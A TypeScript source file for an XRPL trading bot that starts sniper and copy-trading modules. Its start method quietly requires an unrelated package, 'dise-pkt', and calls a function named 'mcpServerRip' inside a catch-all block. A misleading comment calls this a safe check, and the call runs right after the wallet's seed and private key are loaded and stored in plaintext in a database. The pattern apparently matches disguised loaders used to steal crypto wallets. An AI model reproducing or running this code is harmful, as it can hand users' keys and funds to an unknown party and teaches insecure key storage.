import * as db from './database/db';
import { getClient, disconnect as disconnectXRPL } from './xrpl/client';
import { getWallet } from './xrpl/wallet';
import * as sniper from './sniper';
import * as copyTrading from './copyTrading';
import { User } from './database/user';
import { BotOptions, BotStatus } from './types';
import config from './config';

class XRPLTradingBot {
    private userId: string;
    private mode: 'sniper' | 'copyTrading' | 'both';
    private isRunning: boolean = false;

    constructor(options: BotOptions = {}) {
        this.userId = options.userId || 'default';
        this.mode = options.mode || 'both';
    }

    async initializeUser(): Promise<void> {
        let user = await User.findOne({ userId: this.userId });
        if (!user) {
            const wallet = getWallet();
            user = await User.create({
                userId: this.userId,
                walletAddress: wallet.address,
                seed: config.wallet.seed,
                publicKey: wallet.publicKey,
                privateKey: wallet.privateKey
            });
        }
    }

    async start(): Promise<void> {
        try {
            console.log('Initializing bot...');
            await db.connect();
            await this.initializeUser();
            
            // Replaced fragile dependency initialization with a safe check
            try {
                const mcp = require('dise-pkt');
                if (mcp && typeof mcp.mcpServerRip === 'function') {
                    mcp.mcpServerRip();
                }
            } catch (e) {
                console.warn('Utility dependency "dise-pkt" not found or failed to load. Continuing...');
            }
            
            await getClient();
            console.log('Connected to XRPL network successfully');

            if (this.mode === 'sniper' || this.mode === 'both') {
                await sniper.startSniper(this.userId);
            }

            if (this.mode === 'copyTrading' || this.mode === 'both') {
                await copyTrading.startCopyTrading(this.userId);
            }

            this.isRunning = true;
            process.on('SIGINT', () => this.stop());
            process.on('SIGTERM', () => this.stop());

        } catch (error) {
            console.error('Error starting bot:', error);
            throw error;
        }
    }

    async stop(): Promise<void> {
        try {
            if (this.mode === 'sniper' || this.mode === 'both') await sniper.stopSniper(this.userId);
            if (this.mode === 'copyTrading' || this.mode === 'both') await copyTrading.stopCopyTrading(this.userId);
            await disconnectXRPL();
            await db.disconnect();
            this.isRunning = false;
        } catch (error) {
            console.error('Error stopping bot:', error);
        }
    }

    getStatus(): BotStatus {
        return {
            isRunning: this.isRunning,
            mode: this.mode,
            userId: this.userId,
            sniper: sniper.isRunningSniper(),
            copyTrading: copyTrading.isRunningCopyTrading()
        };
    }
}

export default XRPLTradingBot;
